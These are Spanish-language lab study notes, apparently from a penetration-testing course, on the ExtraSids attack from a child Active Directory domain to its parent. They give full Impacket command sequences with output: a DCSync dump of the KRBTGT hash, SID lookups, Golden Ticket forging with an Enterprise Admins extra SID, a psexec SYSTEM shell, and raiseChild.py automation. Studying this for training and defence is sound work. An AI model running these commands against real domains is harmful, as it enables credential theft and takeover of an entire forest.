
## 1. Objetivo del ataque

El ataque **ExtraSids** también puede realizarse desde Linux utilizando herramientas de Impacket.

El objetivo es aprovechar una confianza entre un dominio hijo comprometido y su dominio padre para obtener privilegios en el dominio raíz del bosque.

En el laboratorio se trabaja con:

- **Dominio hijo:** `LOGISTICS.INLANEFREIGHT.LOCAL`
    
- **Dominio padre:** `INLANEFREIGHT.LOCAL`
    
- **Controlador del dominio hijo:** `172.16.5.240`
    
- **Controlador del dominio padre:** `172.16.5.5`
    

### Datos necesarios

|Dato|Función|
|---|---|
|Hash NT de `KRBTGT` del dominio hijo|Permite construir el Golden Ticket del dominio hijo.|
|SID del dominio hijo|Identifica el dominio al que pertenece el ticket.|
|Nombre del usuario objetivo|Identidad representada en el ticket; en el laboratorio se utiliza `hacker`.|
|FQDN del dominio hijo|Identifica el dominio en Kerberos.|
|SID de `Enterprise Admins` del dominio padre|SID privilegiado que se incorpora como SID adicional.|

## 2. Obtener el hash de KRBTGT con secretsdump.py

`secretsdump.py`, de Impacket, permite realizar operaciones de extracción de credenciales. En el laboratorio se utiliza para obtener los datos de `KRBTGT` mediante DCSync.

### Comando del laboratorio

```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

La herramienta solicita la contraseña y muestra el hash NTLM de la cuenta `KRBTGT`, además de las claves Kerberos disponibles.

Ejemplo de salida relevante:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

El hash NTLM mostrado en el laboratorio es:

```
9d765b482771505cbe97411065964d5f
```

**Importante:**

- El comando se ejecuta contra el controlador de dominio hijo.
    
- Se necesitan privilegios de replicación suficientes para realizar DCSync.
    
- Los secretos obtenidos corresponden al dominio consultado.
    

---

## 3. Obtener el SID del dominio hijo con lookupsid.py

`lookupsid.py` permite consultar identificadores de seguridad mediante el servicio LSA de Windows. Impacket enumera los SID y RID que puede resolver con las credenciales proporcionadas.

### Enumerar los SID

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

La salida muestra el SID del dominio y las cuentas y grupos identificados.

Ejemplo:

```
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

### Filtrar la salida

Para mostrar únicamente la línea del SID del dominio:

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

El SID del dominio hijo es:

```
S-1-5-21-2806153819-209893948-922872689
```

### Comprender SID y RID

Un SID de cuenta se compone del SID del dominio y un identificador relativo o RID.

Por ejemplo, en el laboratorio:

```
SID del dominio:
S-1-5-21-2806153819-209893948-922872689

RID de lab_adm:
1001

SID de lab_adm:
S-1-5-21-2806153819-209893948-922872689-1001
```

## 4. Obtener el SID de Enterprise Admins del dominio padre

Para obtener el SID del dominio raíz, se ejecuta `lookupsid.py` contra su controlador de dominio.

### Comando del laboratorio

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

La salida identifica el SID del dominio padre y los RID de sus cuentas y grupos.

Ejemplo:

```
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
...
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

El SID del dominio padre es:

```
S-1-5-21-3842939050-3880317879-2865463114
```

El RID de `Enterprise Admins` es `519`.

Por tanto, el SID completo del grupo es:

```
S-1-5-21-3842939050-3880317879-2865463114-519
```

**Concepto clave:** el SID del dominio por sí solo no identifica al grupo. Hay que añadir el RID correspondiente para obtener su SID completo.

## 6. Construir el Golden Ticket con ticketer.py

`ticketer.py`, de Impacket, permite crear tickets Kerberos. En el escenario estudiado, se construye un Golden Ticket para el dominio hijo que incorpora el SID de `Enterprise Admins` del dominio raíz como SID adicional.

### Parámetros importantes

|Parámetro|Función|
|---|---|
|`-nthash`|Hash NT de KRBTGT utilizado para firmar y cifrar el ticket.|
|`-domain`|FQDN del dominio hijo.|
|`-domain-sid`|SID del dominio hijo.|
|`-extra-sid`|SID adicional que se incorpora al ticket.|
|Último argumento|Nombre del usuario que se representará en el ticket.|

### Ejemplo del laboratorio

```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  hacker
```

La herramienta genera un archivo de caché de credenciales:

```
hacker.ccache
```

### ¿Qué es un archivo ccache?

Un archivo `ccache` almacena credenciales y tickets Kerberos para que las herramientas compatibles puedan utilizarlos durante la autenticación.

En este escenario, `ticketer.py` guarda el ticket generado en ese formato.

---

## 7. Seleccionar la caché Kerberos con KRB5CCNAME

Para que las herramientas compatibles con Kerberos utilicen el archivo generado, el laboratorio establece la variable de entorno `KRB5CCNAME`.

```
export KRB5CCNAME=hacker.ccache
```

Esta variable indica qué caché de credenciales Kerberos debe utilizar el cliente.

**Importante:** el archivo debe estar disponible en la ruta indicada. Si se encuentra en otra ubicación, utiliza la ruta correspondiente.

## 8. Acceder al dominio padre con psexec.py

El laboratorio utiliza `psexec.py`, de Impacket, para comprobar si el ticket permite acceder al controlador de dominio padre.

### Comando del laboratorio

```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local \
  -k -no-pass -target-ip 172.16.5.5
```

### Parámetros importantes

|Parámetro|Función|
|---|---|
|`-k`|Utiliza autenticación Kerberos.|
|`-no-pass`|No solicita una contraseña para esta autenticación.|
|`-target-ip`|Especifica la dirección IP del equipo objetivo.|

En el ejemplo, la autenticación tiene éxito y se obtiene una shell con privilegios `SYSTEM` en el controlador de dominio padre.

La salida del laboratorio confirma el resultado:

```
C:\Windows\system32> whoami
nt authority\system
```

**Nota:** obtener este resultado depende de que el ticket sea aceptado, la confianza permita la autenticación y las condiciones de acceso al servicio sean favorables. La presencia del archivo `ccache` por sí sola no garantiza acceso.

## 9. Automatizar el proceso con raiseChild.py

Impacket incluye `raiseChild.py`, una herramienta que automatiza gran parte del ataque de escalada desde un dominio hijo hacia el padre.

### Comando del laboratorio

```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

La herramienta solicita las credenciales y realiza una secuencia de operaciones.

### Flujo automatizado

Según la descripción del laboratorio, el proceso es el siguiente:

1. Localiza el controlador de dominio hijo.
    
2. Identifica el FQDN del bosque.
    
3. Obtiene el SID de `Enterprise Admins` del dominio raíz.
    
4. Recupera las credenciales de KRBTGT del dominio hijo.
    
5. Crea un Golden Ticket que incorpora el SID adicional.
    
6. Utiliza el ticket para acceder al dominio raíz y recuperar las credenciales de la cuenta objetivo.
    
7. Puede guardar el ticket en formato `ccache`.
    
8. Si se especifica `-target-exec`, intenta abrir una sesión mediante PsExec en el equipo indicado.
    

En el ejemplo, la herramienta consigue abrir una shell con privilegios `SYSTEM` en el controlador de dominio padre.

### Ventajas y riesgos de la automatización

**Ventaja:** reduce el trabajo manual y permite ejecutar varias etapas de manera consecutiva.

**Riesgos y limitaciones:**

- Si falla una etapa, puede ser más difícil identificar la causa sin conocer el proceso.
    
- Puede ejecutar operaciones que no sean necesarias o apropiadas para una evaluación concreta.
    
- En un entorno real, las acciones automatizadas pueden provocar cambios y alertas de seguridad.
    
- No debe ejecutarse fuera del alcance autorizado.
    

La recomendación del módulo es comprender el procedimiento manual y no depender ciegamente de herramientas de tipo _autopwn_.
